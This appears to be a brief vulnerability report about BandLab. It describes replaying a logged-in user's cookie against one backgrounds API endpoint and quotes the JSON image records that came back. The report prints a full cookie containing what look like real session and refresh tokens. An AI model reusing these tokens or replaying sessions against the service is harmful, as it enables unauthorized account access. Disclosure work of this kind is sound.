# About BandLab Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: auid=c35c3da6-be3b-29a7-7933-9608f69a3c63; _ga=GA1.1.1892111986.1712140183; _gcl_au=1.1.1970999753.1712140183; _fbp=fb.1.1712140183918.226552673; _tt_enable_cookie=1; _ttp=rBnKiogf333HuTpDAHh1gHFaOvX; dicbo_id=%7B%22dicbo_fetch%22%3A1712140536146%7D; signupProvider=Google; sessionKey=eyJhbGciOiJSUzI1NiIsImtpZCI6IjYyNUFFNzI0NDhGODNDQThFRjA3QTI1QTJBQ0Q4RTZGN0IxMzY3NTNSUzI1NiIsInR5cCI6IkpXVCIsIng1dCI6Illscm5KRWo0UEtqdkI2SmFLczJPYjNzVFoxTSJ9.eyJuYmYiOjE3MTIxNDA1NTQsImV4cCI6MTcxMjIyNjk1NCwiaXNzIjoiaHR0cHM6Ly9hY2NvdW50cy5iYW5kbGFiLmNvbS9vYXV0aCIsImF1ZCI6Imh0dHBzOi8vYWNjb3VudHMuYmFuZGxhYi5jb20vb2F1dGgvcmVzb3VyY2VzIiwiY2xpZW50X2lkIjoiYmFuZGxhYl93ZWIiLCJzdWIiOiJhNjBjM2E2YS1mYzg0LTRmMmItYWZkOC1mMDdiYzU1ZGY3MDkiLCJhdXRoX3RpbWUiOjE3MTIxNDA1NTIsImlkcCI6Ikdvb2dsZSIsInVzZXJfbG9naW5fcGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0lYblh4Q2lGX1lUUVMzem5aZHNJODBidm5xLXRQUHhqZXBmblJZUGtfQXJRPXMxMDI0LWMiLCJ1c2VyX2xvZ2luX3Byb3ZpZGVyIjoiR29vZ2xlIiwidXNlcl9jb3VudHJ5IjoiQ04iLCJqdGkiOiI5RUY4MTJGMUNGRTNCMURCNTI3RUZBQTAzNDhDOUU4MSIsInNpZCI6IjdCMzQ1N0MxOURDMzVDQ0M1ODAwRTI5NzFBMjlCOTZDIiwiaWF0IjoxNzEyMTQwNTU0LCJzY29wZSI6WyJvcGVuaWQiLCJwcm9maWxlIiwiZW1haWwiLCJsaW5rZWRfYWNjb3VudHMiLCJvZmZsaW5lX2FjY2VzcyJdLCJhbXIiOlsiZXh0ZXJuYWwiXX0.Znx8bEq3eVtNy5VcgaDOpwxCL-qXBFVVeVgxHYehG-fRgOP11ooGFMxlX_ZA-iIvrIVwHCwJSDRrtZGhUhaCx4xaT6DpdfEfdZFwaLQXIkYRyYjVShGx5PJPYflWN99S-ELlMcMXoJsrhfefCnYHbOeAJrMUcWBTuOQubfM4Ptc7CB5vtZZ0TBnj7ht0rfcSdGiSP3rcSduS6QBtltrI4Y_kNMcDs0VL2pcDkCznzrbmP7qNtnNYEZ0Q7tz8wMwQ0x5YryBdcbcpu6HMbRYlEgt3C-prxYNzJZegySzLkapGItrkAoLQPsg0lfl7USh3vwujY-BHlIKkkFflMx9RQQ; refreshToken=UURBdVY0ZEc5ZktyZG5MTEVBRmQ0bGpVU1VQeVZYaDJUTzluTHNRWVJ1dmtWeXdyNDAveENXbDlCUjdWN2N4MVVRbThweWhhYXVyY2FKc0hrUk5Rd1J2bmxrNjZFNHovQkhyYjhnUExYd2c9; ab.storage.deviceId.c6f4ad64-9704-46af-94be-3f420cee3a5c=g%3A6d92760c-70ee-a726-aea4-7d67276667f2%7Ce%3Aundefined%7Cc%3A1712140437402%7Cl%3A1712140553304; ab.storage.userId.c6f4ad64-9704-46af-94be-3f420cee3a5c=g%3Aa60c3a6a-fc84-4f2b-afd8-f07bc55df709%7Ce%3Aundefined%7Cc%3A1712140553303%7Cl%3A1712140553305; _ga_SD5MPWV79Q=GS1.1.1712140183.1.1.1712140575.0.0.0; ab.storage.sessionId.c6f4ad64-9704-46af-94be-3f420cee3a5c=g%3Acc338b69-7598-82f2-3ec2-8b0eacf9dbcf%7Ce%3A1712142377218%7Cc%3A1712140553304%7Cl%3A1712140577218; amp_bc4156=O0V63jf2sgXk2o2LwEU8w2.YTYwYzNhNmEtZmM4NC00ZjJiLWFmZDgtZjA3YmM1NWRmNzA5..1hqhobhu4.1hqhofr66.t.3.10; _ga_FH1GTMTL3J=GS1.1.1712140437.1.1.1712140579.14.0.0
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: Image Information.

> Request method: GET, information can be obtained by traversing the constructed Boolean value.

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|--------------|---|-----------|
|shixiong yang|https://www.bandlab.com/api/v1.3/backgrounds?isActive=true|isActive=true|



### Leaked packet cases 
``` 
        {
          "id": "17477acd-6715-4208-8cd9-dc55d3c1e9eb",
          "color": "#596443",
          "isActive": false,
          "isDeleted": true,
          "pictureId": "17477acd-6715-4208-8cd9-dc55d3c1e9eb",
          "previewPictureId": "db889739-95c5-4d75-a5d7-ab7b2ca699d5",
          "imageUrl": "https://bandlabimages.azureedge.net/v1.3/backgrounds/17477acd-6715-4208-8cd9-dc55d3c1e9eb",
          "previewImageUrl": "https://bandlabimages.azureedge.net/v1.3/backgrounds/db889739-95c5-4d75-a5d7-ab7b2ca699d5"
       },
       {
          "id": "a298af13-738b-469a-b2b7-b2456405b5b7",
          "color": "#f0869c",
          "isActive": false,
          "isDeleted": false,
          "pictureId": "a298af13-738b-469a-b2b7-b2456405b5b7",
          "previewPictureId": "de17728f-43c0-49e4-ba18-486377dd6fc6",
          "imageUrl": "https://bandlabimages.azureedge.net/v1.3/backgrounds/a298af13-738b-469a-b2b7-b2456405b5b7",
          "previewImageUrl": "https://bandlabimages.azureedge.net/v1.3/backgrounds/de17728f-43c0-49e4-ba18-486377dd6fc6"
       },
```